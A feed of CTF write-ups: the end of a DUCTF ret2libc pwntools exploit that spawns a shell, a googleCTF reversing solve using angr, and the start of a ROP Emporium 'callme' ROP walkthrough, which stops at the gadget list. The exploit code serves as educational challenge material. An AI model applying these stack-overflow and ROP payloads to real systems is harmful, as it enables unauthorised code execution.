log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;system &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(system)))
payload &lt;span style="color:#f92672">=&lt;/span> flat([
cyclic(&lt;span style="color:#ae81ff">56&lt;/span>), ret, pop_rdi, bin_sh, system
])
io&lt;span style="color:#f92672">.&lt;/span>recv()
io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
io&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets run our exploit as expected we get a shell so we&amp;rsquo;ll cat out the &lt;code>flag&lt;/code> now&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Opening connection to chal.duc.tf on port 30003: Done
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/libc.so.6&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> puts@plt: 0x401030
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> __libc_start_main: 0x403ff0
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Leaked libc address, __libc_start_main: 0x7f6172d44ab0
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Address of libc 0x7f6172d23000
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> bin/sh 0x7f6172ed6e9a
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> system 0x7f6172d72440
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
$ ls
flag.txt
&lt;span style="color:#66d9ef">return&lt;/span>-to-what
$ cat flag.txt
DUCTF&lt;span style="color:#f92672">{&lt;/span>ret_pUts_ret_main_ret_where???&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>googleCTF Beginner Reversing</title><link>/posts/googlectf-beginner-reversing/</link><pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate><guid>/posts/googlectf-beginner-reversing/</guid><description>Failures aren&amp;rsquo;t the stepping stones to success they&amp;rsquo;re just stones you&amp;rsquo;re the one who decides to step them - jones
Analysis This is a simple reversing challenge, we need to find the correct flag. The challenge binary has two conditions which prints SUCCESS if the correct flag is passed and it prints FAILURE if its wrong. we can simulate this pretty easy with angr and find the flag
Decompilaton And looking at the decompilation we see a string compare statement which shows the string we&amp;rsquo;re looking for is 16 characters</description><content>&lt;p>&lt;em>&lt;strong>Failures aren&amp;rsquo;t the stepping stones to success they&amp;rsquo;re just stones you&amp;rsquo;re the one who decides to step them
- jones&lt;/strong>&lt;/em>&lt;/p>
&lt;h2 id="analysis">Analysis&lt;/h2>
&lt;p>This is a simple reversing challenge, we need to find the correct flag. The challenge binary has two conditions which prints &lt;code>SUCCESS&lt;/code> if the correct flag is passed and it prints &lt;code>FAILURE&lt;/code> if its wrong.
we can simulate this pretty easy with angr and find the flag&lt;/p>
&lt;h2 id="decompilaton">Decompilaton&lt;/h2>
&lt;p>And looking at the decompilation we see a string compare statement which shows the string we&amp;rsquo;re looking for is 16 characters&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">
undefined4 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int64_t&lt;/span> arg7)
{
&lt;span style="color:#66d9ef">int32_t&lt;/span> iVar1;
undefined auVar2 [&lt;span style="color:#ae81ff">16&lt;/span>];
undefined auStack56 [&lt;span style="color:#ae81ff">16&lt;/span>];
undefined auStack40 [&lt;span style="color:#ae81ff">16&lt;/span>];
&lt;span style="color:#75715e">// [14] -r-x section size 513 named .text
&lt;/span>&lt;span style="color:#75715e">&lt;/span> printf(&lt;span style="color:#e6db74">&amp;#34;Flag: &amp;#34;&lt;/span>);
__isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%15s&amp;#34;&lt;/span>, auStack56);
auVar2 &lt;span style="color:#f92672">=&lt;/span> pshufb(auStack56, _SHUFFLE);
auStack40 &lt;span style="color:#f92672">=&lt;/span> CONCAT412(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x60&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ftcg&lt;/span>&lt;span style="color:#ae81ff">\x02\x06\a\x01\x05\v\t\x0e\x03\x0f\x04\b\n\f\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>._0_4_,
CONCAT48(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x4068&lt;/span>,
CONCAT44(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x4064&lt;/span>, SUB164(auVar2, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> _ADD32))
) &lt;span style="color:#f92672">^&lt;/span> _XOR;
iVar1 &lt;span style="color:#f92672">=&lt;/span> strncmp(SUB168(auStack40, &lt;span style="color:#ae81ff">0&lt;/span>), auStack56, auStack40, &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> ((iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (iVar1 &lt;span style="color:#f92672">=&lt;/span> strncmp(auStack40, _EXPECTED_PREFIX, &lt;span style="color:#ae81ff">4&lt;/span>), iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
puts(&lt;span style="color:#e6db74">&amp;#34;SUCCESS&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
puts(&lt;span style="color:#e6db74">&amp;#34;FAILURE&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">iVar1 &lt;span style="color:#f92672">=&lt;/span> strncmp(SUB168(auStack40, &lt;span style="color:#ae81ff">0&lt;/span>), auStack56, auStack40, &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>0x10 which is 16 in decimal and that has a null byte at end so its considered 16 but the exact size is 15&lt;/p>
&lt;p>Now we lookup for the addresses of the failure string and success string&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">0x00001100 lea rdi, str.FAILURE ; 0x2018 ; const char *s
0x00001107 mov r12d, &lt;span style="color:#ae81ff">1&lt;/span>
0x0000110d call puts ; sym.imp.puts ; int puts&lt;span style="color:#f92672">(&lt;/span>const char *s&lt;span style="color:#f92672">)&lt;/span>
0x00001112 add rsp, 0x28
0x00001116 mov eax, r12d
0x00001119 pop rbp
0x0000111a pop r12
0x0000111c ret
0x0000111d lea rdi, str.SUCCESS ; 0x2010 ; const char *s
0x00001124 call puts ; sym.imp.puts ; int puts&lt;span style="color:#f92672">(&lt;/span>const char *s&lt;span style="color:#f92672">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>FAILURE = 0x00001100&lt;/code>&lt;/p>
&lt;p>&lt;code>success = 0x0000111d&lt;/code>&lt;/p>
&lt;h1 id="solution">Solution&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> angr
&lt;span style="color:#f92672">import&lt;/span> claripy
&lt;span style="color:#f92672">import&lt;/span> sys
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(argv):
path_to_binary &lt;span style="color:#f92672">=&lt;/span> argv[&lt;span style="color:#ae81ff">1&lt;/span>]
project &lt;span style="color:#f92672">=&lt;/span> angr&lt;span style="color:#f92672">.&lt;/span>Project(path_to_binary)
length &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>
characters &lt;span style="color:#f92672">=&lt;/span> [claripy&lt;span style="color:#f92672">.&lt;/span>BVS(&lt;span style="color:#e6db74">&amp;#39;flag{-&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span>i, &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(length)]
input_ &lt;span style="color:#f92672">=&lt;/span> claripy&lt;span style="color:#f92672">.&lt;/span>Concat(&lt;span style="color:#f92672">*&lt;/span>characters &lt;span style="color:#f92672">+&lt;/span> [claripy&lt;span style="color:#f92672">.&lt;/span>BVV(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)])
state &lt;span style="color:#f92672">=&lt;/span> project&lt;span style="color:#f92672">.&lt;/span>factory&lt;span style="color:#f92672">.&lt;/span>full_init_state(args&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;path_to_binary&amp;#34;&lt;/span>], stdin&lt;span style="color:#f92672">=&lt;/span>input_)
&lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> characters:
state&lt;span style="color:#f92672">.&lt;/span>solver&lt;span style="color:#f92672">.&lt;/span>add(x &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>) &lt;span style="color:#75715e">## we add constraints to make the flag readable&lt;/span>
state&lt;span style="color:#f92672">.&lt;/span>solver&lt;span style="color:#f92672">.&lt;/span>add(x &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>)
simulate &lt;span style="color:#f92672">=&lt;/span> project&lt;span style="color:#f92672">.&lt;/span>factory&lt;span style="color:#f92672">.&lt;/span>simulation_manager(state) &lt;span style="color:#75715e"># we launch the exploration state for the Success addr and Failure addr&lt;/span>
_success_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0010111d&lt;/span>
_failure_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00101100&lt;/span>
simulate&lt;span style="color:#f92672">.&lt;/span>explore(find&lt;span style="color:#f92672">=&lt;/span>_success_addr, avoid&lt;span style="color:#f92672">=&lt;/span>_failure_addr)
s &lt;span style="color:#f92672">=&lt;/span> []
&lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> simulate&lt;span style="color:#f92672">.&lt;/span>deadended:
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;SUCCESS&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> j&lt;span style="color:#f92672">.&lt;/span>posix&lt;span style="color:#f92672">.&lt;/span>dumps(&lt;span style="color:#ae81ff">1&lt;/span>):
s&lt;span style="color:#f92672">.&lt;/span>append(j)
valid &lt;span style="color:#f92672">=&lt;/span> s[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>posix&lt;span style="color:#f92672">.&lt;/span>dumps(&lt;span style="color:#ae81ff">0&lt;/span>)
print(valid&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
main(sys&lt;span style="color:#f92672">.&lt;/span>argv)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After running our solution script we captured our flag 🚩&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">angr ➤ python solve.py ./a.out
WARNING | 2020-09-09 08:36:15,359 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.
WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.
WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | 1&lt;span style="color:#f92672">)&lt;/span> setting a value to the initial state
WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | 2&lt;span style="color:#f92672">)&lt;/span> adding the state option ZERO_FILL_UNCONSTRAINED_&lt;span style="color:#f92672">{&lt;/span>MEMORY,REGISTERS&lt;span style="color:#f92672">}&lt;/span>, to make unknown regions hold null
WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | 3&lt;span style="color:#f92672">)&lt;/span> adding the state option SYMBOL_FILL_UNCONSTRAINED_&lt;span style="color:#f92672">{&lt;/span>MEMORY_REGISTERS&lt;span style="color:#f92672">}&lt;/span>, to suppress these messages.
WARNING | 2020-09-09 08:36:17,016 | angr.state_plugins.symbolic_memory | Filling memory at 0x7fffffffffefff8 with &lt;span style="color:#ae81ff">8&lt;/span> unconstrained bytes referenced from 0x59f2cd &lt;span style="color:#f92672">(&lt;/span>__strrchr_sse2+0x25d in libc.so.6 &lt;span style="color:#f92672">(&lt;/span>0x9f2cd&lt;span style="color:#f92672">))&lt;/span>
WARNING | 2020-09-09 08:36:18,712 | angr.state_plugins.symbolic_memory | Filling memory at 0x7ffffffffff0000 with &lt;span style="color:#ae81ff">48&lt;/span> unconstrained bytes referenced from 0x58fd40 &lt;span style="color:#f92672">(&lt;/span>strncmp+0x0 in libc.so.6 &lt;span style="color:#f92672">(&lt;/span>0x8fd40&lt;span style="color:#f92672">))&lt;/span>
WARNING | 2020-09-09 08:36:18,724 | angr.state_plugins.symbolic_memory | Filling memory at 0x7ffffffffff0030 with &lt;span style="color:#ae81ff">16&lt;/span> unconstrained bytes referenced from 0x58fd40 &lt;span style="color:#f92672">(&lt;/span>strncmp+0x0 in libc.so.6 &lt;span style="color:#f92672">(&lt;/span>0x8fd40&lt;span style="color:#f92672">))&lt;/span>
CTF&lt;span style="color:#f92672">{&lt;/span>S1MDf0rM3!&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="/images/flag_submitted_compressed.gif" alt="">&lt;/p></content></item><item><title>Ropemporium callme 64bit</title><link>/posts/ropemporium-callme-64bit/</link><pubDate>Sun, 06 Sep 2020 00:00:00 +0000</pubDate><guid>/posts/ropemporium-callme-64bit/</guid><description>&amp;ldquo;Failure is not an option&amp;rdquo;
Important note &amp;gt; To dispose of the need for any RE I&amp;rsquo;ll tell you the following You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
The challenge files can be found here ~&amp;gt; callme</description><content>&lt;blockquote>
&lt;p>&amp;ldquo;Failure is not an option&amp;rdquo;&lt;/p>
&lt;/blockquote>
&lt;h2 id="important-note--">Important note &amp;gt;&lt;/h2>
&lt;p>To dispose of the need for any RE I&amp;rsquo;ll tell you the following
You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)&lt;/p>
&lt;p>The challenge files can be found here ~&amp;gt;
&lt;a href="https://ropemporium.com/challenge/callme.html">callme&lt;/a>&lt;/p>
&lt;p>Before getting our hands onto the challenge let&amp;rsquo;s take a look at x86-64 calling conventions&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
| %rax | %rdi | %rsi | %rdx | %r10 | %r8 | %r9 |
+---------+------+------+------+------+------+------+
&lt;/code>&lt;/pre>&lt;/div>&lt;p>To understand calling conventions better take a look here ~&amp;gt;
&lt;a href="https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI">calling convetions&lt;/a>&lt;/p>
&lt;p>Now lets take a look at the challenge binary&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ checksec callme
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/2-callme/callme64/callme&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
RUNPATH: b&lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This looks similar to the previous challenge we solved&lt;/p>
&lt;p>Lets checkout the functions which are imported from the shared object file&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ rabin2 -i callme
&lt;span style="color:#f92672">[&lt;/span>Imports&lt;span style="color:#f92672">]&lt;/span>
nth vaddr bind type lib name
―――――――――――――――――――――――――――――――――――――
&lt;span style="color:#ae81ff">1&lt;/span> 0x004006d0 GLOBAL FUNC puts
&lt;span style="color:#ae81ff">2&lt;/span> 0x004006e0 GLOBAL FUNC printf
&lt;span style="color:#ae81ff">3&lt;/span> 0x004006f0 GLOBAL FUNC callme_three
&lt;span style="color:#ae81ff">4&lt;/span> 0x00400700 GLOBAL FUNC memset
&lt;span style="color:#ae81ff">5&lt;/span> 0x00400710 GLOBAL FUNC read
&lt;span style="color:#ae81ff">6&lt;/span> 0x00000000 GLOBAL FUNC __libc_start_main
&lt;span style="color:#ae81ff">7&lt;/span> 0x00400720 GLOBAL FUNC callme_one
&lt;span style="color:#ae81ff">8&lt;/span> 0x00000000 WEAK NOTYPE __gmon_start__
&lt;span style="color:#ae81ff">9&lt;/span> 0x00400730 GLOBAL FUNC setvbuf
&lt;span style="color:#ae81ff">10&lt;/span> 0x00400740 GLOBAL FUNC callme_two
&lt;span style="color:#ae81ff">11&lt;/span> 0x00400750 GLOBAL FUNC exit
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Yes we can see the functions which are need for the exploit let&amp;rsquo;s take a note of them&amp;hellip;..&lt;/p>
&lt;p>Next up let&amp;rsquo;s check the functions present in the binary&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
0x00400760 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> entry0
0x004006a8 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
0x004009b4 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> sym._fini
0x004007a0 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">37&lt;/span> sym.deregister_tm_clones
0x004007d0 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">55&lt;/span> sym.register_tm_clones
0x00400810 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">34&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">29&lt;/span> sym.__do_global_dtors_aux
0x00400840 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> entry.init0
0x00400898 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">90&lt;/span> sym.pwnme
0x00400700 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.memset
0x004006d0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.puts
0x004006e0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.printf
0x00400710 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.read
0x004008f2 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">74&lt;/span> sym.usefulFunction
0x004006f0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.callme_three
0x00400740 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.callme_two
0x00400720 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.callme_one
0x00400750 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.exit
0x004009b0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> sym.__libc_csu_fini
0x00400940 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">101&lt;/span> sym.__libc_csu_init
0x00400790 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> sym._dl_relocate_static_pie
0x00400847 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">81&lt;/span> main
0x00400730 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Again we have a useful function lets take a look at it&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400760&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
&lt;span style="color:#f92672">[&lt;/span>0x004008f2&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
┌ 74: sym.usefulFunction &lt;span style="color:#f92672">()&lt;/span>;
│ 0x004008f2 push rbp
│ 0x004008f3 mov rbp, rsp
│ 0x004008f6 mov edx, &lt;span style="color:#ae81ff">6&lt;/span>
│ 0x004008fb mov esi, &lt;span style="color:#ae81ff">5&lt;/span>
│ 0x00400900 mov edi, &lt;span style="color:#ae81ff">4&lt;/span>
│ 0x00400905 call sym.imp.callme_three
│ 0x0040090a mov edx, &lt;span style="color:#ae81ff">6&lt;/span>
│ 0x0040090f mov esi, &lt;span style="color:#ae81ff">5&lt;/span>
│ 0x00400914 mov edi, &lt;span style="color:#ae81ff">4&lt;/span>
│ 0x00400919 call sym.imp.callme_two
│ 0x0040091e mov edx, &lt;span style="color:#ae81ff">6&lt;/span>
│ 0x00400923 mov esi, &lt;span style="color:#ae81ff">5&lt;/span>
│ 0x00400928 mov edi, &lt;span style="color:#ae81ff">4&lt;/span>
│ 0x0040092d call sym.imp.callme_one
│ 0x00400932 mov edi, &lt;span style="color:#ae81ff">1&lt;/span> ; int status
└ 0x00400937 call sym.imp.exit ; void exit&lt;span style="color:#f92672">(&lt;/span>int status&lt;span style="color:#f92672">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>From this we can understand we need to pass the values three times and call the functions respectively and
as per the important note given by the challenge author we can figure out the overview of solving the challenge&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
mov rdi, 0xdeadbeefdeadbeef
mov rsi, 0xcafebabecafebabe
mov rdx, 0xd00df00dd00df00d
call callme_one
mov rdi, 0xdeadbeefdeadbeef
mov rsi, 0xcafebabecafebabe
mov rdx, 0xd00df00dd00df00d
call callme_two
mov rdi, 0xdeadbeefdeadbeef
mov rsi, 0xcafebabecafebabe
mov rdx, 0xd00df00dd00df00d
call callme_three
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rop-gadgets">ROP gadgets&lt;/h2>
&lt;pre>&lt;code>amd64 calling convention requires the arguments to a function to reside in
%rdi, %rsi, %rdx
&lt;/code>&lt;/pre>
&lt;p>To get the values into registers to pass the arguments, we’ll need a gadget that will pop values from the stack into these registers.
Lets checkout the gadgets now using &lt;code>ropper&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ ropper --file callme --search &lt;span style="color:#e6db74">&amp;#39;pop&amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Load gadgets from cache
&lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> loading... 100%
&lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> removing double gadgets... 100%
&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Searching &lt;span style="color:#66d9ef">for&lt;/span> gadgets: pop
&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> File: callme
0x000000000040099c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040099e: pop r13; pop r14; pop r15; ret;
0x00000000004009a0: pop r14; pop r15; ret;
0x00000000004009a2: pop r15; ret;
0x00000000004007bb: pop rbp; mov edi, 0x601070; jmp rax;
0x000000000040099b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040099f: pop rbp; pop r14; pop r15; ret;
0x00000000004007c8: pop rbp; ret;
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; &lt;span style="color:#75715e"># The exact gadget we need :)&lt;/span>
0x00000000004009a3: pop rdi; ret;
